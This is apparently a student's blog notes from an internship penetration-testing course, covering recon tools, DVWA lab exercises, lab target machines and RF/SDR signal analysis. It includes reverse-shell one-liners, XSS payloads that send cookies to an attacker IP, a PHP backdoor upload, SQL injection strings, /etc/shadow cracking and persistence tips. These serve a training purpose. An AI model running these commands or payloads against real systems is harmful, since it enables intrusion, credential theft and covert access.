---
title: Internship Notes - Penetration Testing Course
description: A brief record of the penetration-testing course during my internship
toc: true
tags:
  - Penetration Testing
categories:
  - Study Notes
top_img: 'https://i.imgur.com/zuXQ4RA.jpg'
aside: true
abbrlink: "8ec27a58"
date: 2022-01-10 03:07:06
---

> 🌐 中文版：[繁體中文](/posts/8ec27a58.html)

Course content:
```
- Web basics
- Active/passive information gathering
- Common web vulnerabilities
- Target machines
- DVWA (Damn Vulnerable Web Application)
- RF (radio frequency) penetration testing (IoT)
- Basic communication protocols
- Software-defined radio (SDR)
```

## PT (penetration testing) vs RT (red team exercise)
- PT: smaller scope, and can't target social engineering, e.g. a specific web page
- RT: larger scope, e.g. the whole company

Black box: closest to a real scenario
White box: provide as much relevant info to the tester as possible
Gray box: a mix of black and white box, providing a self-declaration form and then letting the tester test

## Penetration testing flow:
1. Information gathering
2. Vulnerability scanning
3. Exploitation
    White hat:
    4. Vulnerability reporting
    Black hat:
    4. Privilege escalation
    5. Persistent access
    6. Defense evasion (evading those alarms that go off)
    7. Data exfiltration (exfiltrating the DB in batches)
![](https://i.imgur.com/10o9kG8.jpg)

## IoT attack vectors
![](https://i.imgur.com/CFMACnJ.jpg)
- Hardware: physical interface
    Used by developers, often not disabled after shipping; if you can reach the interface you can usually get root directly, and the low level is usually plaintext transmission
    - The device enclosure provides no protection mechanism
    - The low level uses plaintext transmission
    - Glitching: use tiny voltages to disturb the hardware device
    - Side Channel Attack: for an encryption chip, you can measure its voltage, audio, etc., and use these to analyze the encryption method, key, and so on
- Firmware: hardcode, enc key, exploit
    - The software/firmware isn't encrypted
    - Has sensitive data
- Software: Android app
- Radio: cellular, WiFi, cellular networks
    - Unencrypted wireless communication can be sniffed
    - Jamming attacks
    - Replay attacks
    - Fuzzing: needs reverse engineering first before you can fuzz
    - Communication protocol: the most troublesome, needs the OEM to handle
- Cloud:
    - API attacks
    - Injection attacks
    - Authentication/authorization mechanisms
    - Logic flaws
    - Web vulnerabilities

## Web attack vectors
![](https://i.imgur.com/zfkdfrI.jpg)
Web 1.0
- The bulletin-board concept
- Only static pages

Web 2.0
- Readable/writable, multi-function dynamic pages
- Applications
- DB (personal data)
- API
- Different users get different pages

Web 3.0
- Decentralized (data stored distributed)

HTTP
- Composed of request/response
- Since HTTP is stateless, it relies on the cookie mechanism to record user info and time
- Status codes
    ![](https://i.imgur.com/Bk1hb59.png)

## Attack targets
1. User identity
- Authentication
- Permission division
- Session
e.g. HTTP packet formats are all the same

2. Input/output:
- SQL Injection
- Command Injection
- Need normalization processing
- Developers need to set definite characters
e.g. filling a number field with Chinese or English

3. Program logic

## Common tools:
Information Gathering: split into active and passive
- Active information gathering
    ![](https://i.imgur.com/M9nPHnv.png)
    - nmap actively gathers target info: scanning the target host's ports
        ![](https://i.imgur.com/GTvO6kr.jpg)
    - Nikto, an open-source website vulnerability scanner: built into Kali
    - Dirb brute-force enumerates directories and files under a web page
        ```
        dirb url
        # check whether the page stores sensitive data
        # may be able to scan out user paths
        # if Apache is used as a relay, it can be scanned out
        ```
- Passive information gathering
    - Use passive data (IP, name, birthday, etc.) to describe the target
    - Don't contact the target directly, to avoid leaving traces
    - SHODAN
        - Can scan all IoT devices in the world
        - Hosts
        - Open ports
        - Whether there are known vulnerabilities
        - Can search with these keywords:
            - hostname: search a specified host or domain, e.g. hostname:"google"
            - port: search a specified port or service, e.g. port:"21"
            - country: search a specified country, e.g. country:"CN"
            - city: search a specified city, e.g. city:"Hefei"
            - org: search a specified organization or company, e.g. org:"google"
            - isp: search a specified ISP, e.g. isp:"China Telecom"
            - product: search a specified OS/software/platform, e.g. product:"Apache httpd"
            - version: search a specified software version, e.g. version:"1.6.2"
            - geo: search a specified geographic location, with lat/lon args, e.g. geo:"31.8639, 117.2808"
            - before/after: search data before/after a specified indexing time, format dd-mm-yy, e.g. before:"11-11-15"
            - net: search a specified IP address or subnet, e.g. net:"210.45.240.0/24"
            - References:
                - https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf
                - https://www.itread01.com/content/1546699324.html
            
    - Google Hacking
        - Use Google Search to gather intelligence on the target
        - Use "site:" to search

- Filtering packets
    - Burp Suite
        How to use:
        Open Burp Suite in Kali
        ![](https://i.imgur.com/8gomHwp.png)
        Enabling the proxy means all traffic afterward goes through Burp
        <older versions need a certificate signed>
        Open the browser via the proxy
        ![](https://i.imgur.com/dWxhFur.png)
        Go to Project Options > MISC > check Enable
        ![](https://i.imgur.com/vswHeoq.png)
        Then you can keep using the proxy
        ![](https://i.imgur.com/HwXBX1w.png)
        Open the IP or URL in the browser, and the packets get intercepted into the browser
        ![](https://i.imgur.com/OATh3RT.png)
        <br><br>

- Brute force
    ![](https://i.imgur.com/YuudCcZ.png)
    ![](https://i.imgur.com/kf2mOL5.png)
    Different attack types have different modes
    Sniper: tests values from the dictionary in alternating order
    ![](https://i.imgur.com/An2qwjw.png)
    Send the access content to Repeater to confirm the response
    ![](https://i.imgur.com/Tgird85.png)

    ![](https://i.imgur.com/nwWHDyM.png)

<br>

## Command Injection
Because user input isn't filtered, it can cause sensitive-data leakage and other problems
Linux command

| Column 1 | Column 2 | 
| -------- | -------- | 
| ; or &     | runs the second command regardless of whether the first succeeded     | 
| &&     | won't run the next command if the first fails     | 
|  \| (pipe)    | takes the previous command's output as the next command's input     |
|  \|\| (double pipe)    | runs the next command only if the previous fails     |

---

## DVWA
1. Enter IP to get shell

![](https://i.imgur.com/GZG7eOA.png)
You can add some Linux commands to the command
![](https://i.imgur.com/FI8yUNJ.png)

![](https://i.imgur.com/33iCHlV.png)
cat to dump /etc/shadow
![](https://i.imgur.com/zthZGDt.png)
ls -al to view file permissions
![](https://i.imgur.com/Fl5HR9S.png)

ls -al | grep shadow
linux
/etc/passwd: Linux used to store all accounts/passwords here
/etc/shadow: modern Linux separates it out

#### *Reverse shell*
The victim's machine connects back to the attacker's machine (going out is easier than coming in)

**Bash**
- Victim: bash -i >& /dev/tcp/ip/port 0>&1
- Attacker: nc -nvlp port

**Netcat**
- Victim: nc ip port -e /bin/bash
- Attacker: nc -nvlp port

![](https://i.imgur.com/WHPfdBH.png)

**john the ripper** brute force
See the Linux /etc/shadow file structure
https://blog.gtwang.org/linux/linux-etc-shadow-file-format/

xdg-open >> presents the file so you can open it directly

<br>

**Cracking the Linux root password**
Merge passwd and shadow, writing into crack
```
unshadow passwd shadow > crack
```
![](https://i.imgur.com/vRRh7bK.png)
Use john to crack the password
![](https://i.imgur.com/JiAkG0d.png)

**Cracking the Windows root password**
SAM file
NTLM hash
Net-NTLM, where key exchange happens over the network

**CVE Details**
You can track vulnerabilities
Won't have the code for how to exploit them
**ExploitDB**
Can track vulnerabilities
Remote code execution (RCE) vulnerabilities

**Metasploit**
https://ithelp.ithome.com.tw/articles/10224527

```
msfconsole
```
![](https://i.imgur.com/fGYsqLW.png)

![](https://i.imgur.com/nUGB4m6.png)

## Target machine test (192.168.5.107)
### NET config
The network must use a bridged adapter

1. <Information gathering> First test which ports on the victim machine are open
Use nmap to view open ports
![](https://i.imgur.com/4YYhxLY.png)
You can see what commands are available in bin
![](https://i.imgur.com/5HngrIj.png)

2. <Exploit a weakness> Login
Use SQL Injection to log in

3. Use the victim computer to connect back to the attacker computer
You can use these two:
- bash
- netcat

4. <Information gathering> Gather info on the victim computer
```
whoami
uname -a
lsb_release -a
```
![](https://i.imgur.com/W7DQDcI.png)

5. <Vulnerability scanning> Use ExploitDB to look up vulnerabilities
    ![](https://i.imgur.com/IajKmAT.png)

    ![](https://i.imgur.com/BFOaibq.png)

6. Open an Apache service on the local computer
    ![](https://i.imgur.com/6Cimn6A.png)
    The opened screen looks like this
    ![](https://i.imgur.com/TZk5bR6.png)
    Put the needed files into the Apache folder so the victim computer can later download the data from Apache
    ![](https://i.imgur.com/AO8UQ2n.png)
    ![](https://i.imgur.com/Pe9lYUr.png)

7. <Exploit> Download the exploit file on the victim computer
    Use pwd to confirm the location points to tmp
    (since privileges are insufficient, you need a location the current privileges can read/write)
    Use wget to download from the locally-opened Apache
    ![](https://i.imgur.com/RdeYP6B.png)
    ![](https://i.imgur.com/wVEsi1U.png)
    Confirm permissions
    ![](https://i.imgur.com/oc9Q7jV.png)

### File Upload
Use weevely to generate backdoor.php
![](https://i.imgur.com/perGeXy.png)
Upload the file back to the DVWA site
![](https://i.imgur.com/uZlHxZq.png)
Use weevely to connect to the uploaded path
```
weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(password)
```
![](https://i.imgur.com/PkDJBTn.png)
Check the host status
![](https://i.imgur.com/L9KupbP.png)

<medium difficulty>
The front end blocks non-images
First change the malicious file to .jpeg

Upload the file, use Burp Suite to intercept the packet, and change the filename in the packet to php
![](https://i.imgur.com/DKwFDBe.png)

### LFI (Local File Inclusion)
Local file inclusion vulnerability (LFI)

Sensitive files:
- **/etc/passwd**
- **/var/log/auth.log**
    - records which users connected to this machine
- **/var/log/apache2/access.log/error.log**
    - which error messages have appeared
- **../../../**
    - can browse which files it has
- **%WINDIR%\win.ini**
    - Windows config file, you can see config

You can put an **absolute path** after `?page=` to look up data
![](https://i.imgur.com/KLw7zdD.png)

![](https://i.imgur.com/2pHxd91.png)

![](https://i.imgur.com/QGulfsK.png)

### RFI (Remote File Inclusion)
Has an RFI vulnerability
Needs these functions enabled:
- allow_url_fopen
- allow_url_include

![](https://i.imgur.com/DDVoXPL.png)

### XSS
Cross-Site Scripting
The target is the user side, not the server side

Exploitation conditions
- The server doesn't filter user-submitted data strictly enough
- Use social engineering to get the victim to click and trigger it
Impact:
- Redirect (malware) to a site they shouldn't be redirected to
- Steal cookies
- Phishing
Types:
- Reflected: returns a script that the user has to click to be affected
- Stored: the JS code is stored on the server, and triggers whether or not the user clicks

Insert JS code
```
<script>alert("call 911")</script>
```
![](https://i.imgur.com/T3rDDKJ.png)
![](https://i.imgur.com/oOGulM2.png)
```
<script>alert(document.cookie)</script>
```
![](https://i.imgur.com/191wpbd.png)
![](https://i.imgur.com/0T1ttyT.png)

Steal info from the user and send it to the attacker
Listen on port 80
Enter JS code to connect to the attacker's IP and send back the cookie
```
<script>new image().src="http://ip/output="+document.cookie;</script>
```
![](https://i.imgur.com/Q0T1jW9.png)

<medium difficulty>
If script is filtered out, you can use mixed case to obfuscate it
e.g.
```
<sCripT>new image().src="http://ip/output="+document.cookie;</sCripT>
```

![](https://i.imgur.com/4Y4hqwD.png)

![](https://i.imgur.com/e26A9bc.png)

```

```

XSS stored

![](https://i.imgur.com/gJi4QzR.png)

![](https://i.imgur.com/QEBAcB9.png)

## Target machine test 2 (192.168.0.182)
1. Gather data
Use dirb to gather web data

Use nmap -A to view which ports are open on the host
![](https://i.imgur.com/M19pxyW.png)
You can target/attack samba among them
(samba has quite a few holes)

2. Open msfconsole
![](https://i.imgur.com/zXZNme2.png)

3. Search for samba vulnerabilities
![](https://i.imgur.com/4FDBxJQ.png)

4. Compile the exploit script
![](https://i.imgur.com/4LaDpTB.png)

5. Run the exploit script
![](https://i.imgur.com/97zdWV8.png)
(and you can connect in and get root)

How to maintain the connection process?
**The closer to user behavior, the better and harder to detect**
1. Create a new account
2. Brute-force its other account passwords
3. Insert a service (but AD may cut it off)
4. Create a connection back to your own host (but AD may cut it off)

How To Create a Sudo User in Linux?
https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart

### CSRF
Intercept the change-password page
![](https://i.imgur.com/FUBku23.png)

Copy the packet's URI
![](https://i.imgur.com/1LTXzYP.png)

Executing the URI changes the password
![](https://i.imgur.com/POuyWXz.png)
Shortening the URI makes it more covert

### XSS + CSRF combo
```
<script>new Image().src="change-password URI"</script>
```
- Reflected: clicking this image changes it
- Stored: after login, browsing to a specific image with the cookie changes it

### SQL Injection (dumping the DB)
The server doesn't filter, so entered SQL syntax is parsed and the result returned
SQL basics:
- Select DB
- Select table
- Select column
- Data

Log into the DB
```
mysql -u root -h IP
show DB;
use dvwa;
show tables;
```
![](https://i.imgur.com/aK34Mju.png)
![](https://i.imgur.com/pmUsGxs.png)

select
![](https://i.imgur.com/2ljNhS8.png)
![](https://i.imgur.com/dmWdah5.png)

Information Schema
- Information_schema.schemata: all DBs
- Information_schema.tables: all tables
- Information_schema.columns: all columns

![](https://i.imgur.com/Adjm06U.png)
![](https://i.imgur.com/f6uOTKJ.png)

Entering 1 produces info for ID 1
![](https://i.imgur.com/kpFZTul.png)
So you can use select syntax to enter all DBs
```
1 ' union select 1, schema_name from information_schema.schemata # 
```
![](https://i.imgur.com/iQecQTk.png)
```
1 ' union select 1, table_name from information_schema.tables # 
```
![](https://i.imgur.com/O5Ba3HO.png)

```
1 ' union select 1, table_name from information_schema.tables where table_name='dvwa'# 
```
![](https://i.imgur.com/sLCOQpN.png)

![](https://i.imgur.com/mRMPxDH.png)

![](https://i.imgur.com/9QEBR9x.png)

---
## Handy resources
- Payload All The Things
https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFObins: various reverse shells
https://gtfobins.github.io/
- XSS Bypass Filter
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

----
## RF penetration testing

Install basic packages
```
sudo apt-get install gnuradio 
sudo apt-get install gr-osmosdr
sudo apt-get install rtl-sdr
rtl_test
```
![](https://i.imgur.com/Dpat9WW.png)

**Open osmocom_fft**
osmocom_fft
![](https://i.imgur.com/Ewe4E1Y.png)

### Communication overview
Signals:
- Analog signal: a signal produced by changes in amplitude, which can carry information
    - Hertz (Hz): how many oscillations per second
- Digital signal: represented as 0 or 1, not used to carry information

Frequency: how many oscillations per second, cycles per second
Bandwidth: describes the range of frequencies, also called bandwidth

FFT algorithm:
- Center Frequency: (f max + f min)/2
- Bandwidth (channel width): |f max - f min|

Spectrum allocation:
![](https://i.imgur.com/YFYcJnm.png)

ISM band:
- No license or government fee needed
- 2.4GHz, 868MHz

Sub-1G band:
- Bands below 1GHz are called Sub-1GHz

Transmit: modulation -> message × carrier = signal
Receive: demodulation
- Analog modulation
    - Frequency Modulation (FM): uses signal frequency density to represent
    - Amplitude Modulation (AM): uses signal amplitude level to represent
    - Phase Modulation (PM): uses different phases (angles) to represent
- Digital modulation
    - Amplitude-Shift Keying (ASK)
    - Frequency-Shift Keying (FSK)
    - Phase-Shift Keying (PSK)
    - Orthogonal Frequency-Division Multiplexing (OFDM), e.g. WiFi
- Comparison
    ![](https://i.imgur.com/dY7rAqQ.jpg)

Simplex: receive only, or transmit only
Half-duplex: can choose one of receive/transmit at a time, e.g. radio
Duplex: can transmit & receive at the same time, e.g. phone

Current:
current on a conductor - transmitter (Tx) -> air interface -> receiver (Rx) - current on a conductor

Wireless IC Dongle
![](https://i.imgur.com/1ZEd9lh.jpg)
SDR Platforms
![](https://i.imgur.com/W28jivl.jpg)

Wireless IC Dongle vs SDR Platforms
- Wireless IC Dongle: after receiving a signal, sends the demodulated signal to the computer
- SDR Platforms: after receiving a signal, sends the undemodulated signal to the computer

Gain vs Loss
- Gain: output signal > input signal; by conservation of energy, the signal doesn't grow for no reason, so it's amplified via current
- Loss: input signal > output signal; energy-conservation conversion via heat

Decibels are used as the comparison measure

Sampling theorem:
To convert an analog signal to a digital one via sampling, how many points are needed to represent one wave?
> <fs sampling rate, f sampling frequency, B bandwidth>
1. Low-pass sampling theorem: sampling rate is at least twice the sampling frequency
    fs = 2 × f
2. Band-pass sampling theorem: sampling rate is at least twice the bandwidth
    fs = 2 × B

- Decimation: lower the sampling rate
- Interpolation: raise the sampling rate

- Aliasing effect: occurs at the signal's center frequency ± sampling rate

Matching:
- RF signal impedance 50 Ω (Ohm)
- Video signal impedance 75 Ω (Ohm)
- Poor matching: RF signal will have reflection issues, and in severe cases may burn out

```
gnuradio-companion
```
![](https://i.imgur.com/oKM0usX.png)

Each item in the figure is a function module connected together
NBFM Receive is the receive for demodulating the signal; without it, it won't work
![](https://i.imgur.com/03kHTTz.png)

Open a new flow graph
File > New > WX GUI
![](https://i.imgur.com/zvMNJRR.png)
Area intro
![](https://i.imgur.com/o05gLr3.png)
RTL-SDR parameter settings
![](https://i.imgur.com/UCRfAXd.png)
You can change the variable so all variables related to samp_rate change together
![](https://i.imgur.com/GgUS5UZ.png)

Save all signals received by the RTL to a file
![](https://i.imgur.com/bKGy7Eq.png)
Give file_sink the storage location
![](https://i.imgur.com/gAJTMBu.png)

```
inspectrum <file>
```
![](https://i.imgur.com/Jf8QIdk.png)

### Components
Active: needs power to operate
Passive: operates without power

- Amplifier:
    - Three properties: gain, noise figure, linearity
        - Gain: expressed in dB
        - Noise figure: expressed in dB
        - Linearity: degree of distortion
    - Three types: low-noise, high-power, other

- Antenna
    - Antenna: receives and transmits signals
        - Omnidirectional antenna: all around
        - Directional antenna: only one angle
        - Gain antenna: sacrifices the electromagnetic field; not power gain but directional gain
        - Active antenna: must include power gain
    - Frequency: determines the antenna's size
    - Propagation direction: determines the antenna's shape
        - Omnidirectional: all around
        - Directional: only one angle
    - Power: determines the antenna's size

- Filter
    - Divides different signals by "frequency"
    ![](https://i.imgur.com/A44cWOA.jpg)
    - Frequency response: beyond its frequency, the effect declines
    - Filters out frequencies you don't want

- Mixer:
    - Changes the signal's frequency while keeping other characteristics, i.e. doing modulation
    - A mixer is usually followed by a filter
    - Harder to digitize
- Oscillator:
    - Harder to digitize
- Component comparison
    ![](https://i.imgur.com/sQIJs7D.jpg)
- Component communication
    - Transmitter
    ![](https://i.imgur.com/DrcyGdD.jpg)
    
    - Receiver

### Reverse engineering

Flow:
1. Find the signal
2. Capture the signal
2. Analyze the signal

#### Analyze the signal:
- Preamble: tells both sides to get ready to connect
    - Common: 0xaaaa, 0x5555
- Sync Word: "I'm about to start transmitting data now!"
    - Common: 0xd391

![](https://i.imgur.com/naYlFWK.png)

![](https://i.imgur.com/LzH7Dfk.png)

> FFT size: adjusts the frequency-axis scaling
> Zoom: adjusts time
> Power Max: adjusts signal display
> Power Min: adjusts background-noise display
Adjust Zoom & FFT size
![](https://i.imgur.com/COKLijI.jpg)

![](https://i.imgur.com/GEQlM5t.png)
Make the red line hug the signal
![](https://i.imgur.com/MNNMpqH.png)

You can see the amplitude below (the green line)
![](https://i.imgur.com/aEW6fvE.jpg)

#### urh signal analysis
![](https://i.imgur.com/cmzuK6s.png)
analysis
![](https://i.imgur.com/aGQYkkS.png)

### Analysis exercises

#### Doorbell exercise
frequency 240~960MHz

modulation OOK (On-Off Keying, a kind of ASK) or ASK

preamble size 0
preamble 0x55 or 0xaa

Sync size 32 bits
Sync Word 0x80000000

Packet Structure:
Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8

Once you understand the packet structure, the next step is to simulate a similar packet structure and send it back to the IoT device. If the original signal doesn't filter the needed values, i.e. changing the length or content in the Data part, will the IoT device crash?

PWM
- high-high-low 1
- high-low-low 0
- PWM coding is often modulated with ASK
- bit rate = baud rate / 3 = symbol rate / 3
Manchester test
- high voltage to low voltage is 0
- low voltage to high voltage is 1
- bit rate = baud rate / 2 = symbol / 2

#### Unknown exercise
- Identify Application
    - remote controlled car application
- Identify Modulation Type
    - ASK/OOK
- Identify Preamble
    - No
- Identify Sync Word
    - 4*W2 or W2 both work
- Identify Encoding
    - NRZ (often modulated with ASK, but this case is an exception)

- Identify 4 Signal Functions
    - ![](https://i.imgur.com/cZLi4qY.png)
    - up: w2x4 + w1x10
    - down: w2x4 + w1x40
    - right: w2x4 + w1x64
    - left: w2x4 + w1x58
- Identify Packet Structure
![](https://i.imgur.com/3oTSfia.png)
![](https://i.imgur.com/GokBAQ8.png)

## apache2 server
**Reference**
https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache
https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/
- install
```
sudo apt update
sudo apt install apache2
```
- start
```
# sudo /etc/init.d/apache2 start
```
- restart
```
# sudo /etc/init.d/apache2 restart
```
- stop
```
# sudo /etc/init.d/apache2 stop
```
